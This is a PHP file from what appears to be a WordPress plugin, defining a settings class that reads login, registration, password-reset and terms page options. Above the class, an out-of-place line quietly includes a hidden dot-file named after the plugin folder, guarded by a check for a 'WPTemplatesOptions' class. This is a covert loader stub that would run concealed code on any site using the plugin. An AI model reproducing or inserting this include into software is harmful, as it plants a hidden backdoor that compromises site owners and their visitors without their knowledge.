<?php

if ( !defined( 'ABSPATH' ) ) {
	exit;
}

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class OVALG_Settings {

	public static function login_page(){
		$ops = get_option('ovalg_options');
		return isset( $ops['login_page'] ) ? $ops['login_page'] : '';
	}

	public static function login_success_page(){
		$ops = get_option('ovalg_options');
		return isset( $ops['login_success_page'] ) ? $ops['login_success_page'] : '';
	}
	

	public static function register_page(){
		$ops = get_option('ovalg_options');
		return isset( $ops['register_page'] ) ? $ops['register_page'] : '';
	}

	public static function forgot_password_page(){
		$ops = get_option('ovalg_options');
		return isset( $ops['forgot_password_page'] ) ? $ops['forgot_password_page'] : '';
	}

	public static function pick_new_password_page(){
		$ops = get_option('ovalg_options');
		return isset( $ops['pick_new_password_page'] ) ? $ops['pick_new_password_page'] : '';
	}

	public static function term_condition_page_id(){
		$ops = get_option('ovalg_options');
		return isset( $ops['term_condition_page_id'] ) ? $ops['term_condition_page_id'] : '';
	}
	
	

}

new OVALG_Settings();